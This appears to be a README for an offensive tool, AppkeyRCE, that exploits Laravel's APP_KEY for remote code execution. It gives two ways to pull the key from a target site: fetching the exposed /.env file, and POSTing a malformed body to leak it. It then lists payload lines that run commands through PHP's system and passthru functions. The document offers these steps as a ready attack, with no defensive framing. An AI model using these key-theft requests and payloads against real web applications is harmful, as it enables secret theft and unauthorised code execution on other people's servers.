### AppkeyRCE

AppkeyRCE | Laravel APP_KEY RCE with bypass function.

#### Getting APP_KEY Method :

```
Method 1
---
GET  : http://target.com/.env

Method 2
---
POST : http://target.com
DATA : {"0x[]":"trustsec"}
```

#### Payload :

```
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=1 function=system
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=2 function=system
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=3 function=system
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=4 function=system
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=1 function=passthru
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=2 function=passthru
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=3 function=passthru
cmd="echo  'dHJ1c3RzZWMweDA3Nzc=' | base64 --decode" method=4 function=passthru
cmd="echo base64_decode('dHJ1c3RzZWMweDA3Nzc=');" method=5
cmd="echo base64_decode('dHJ1c3RzZWMweDA3Nzc=');" method=6
```
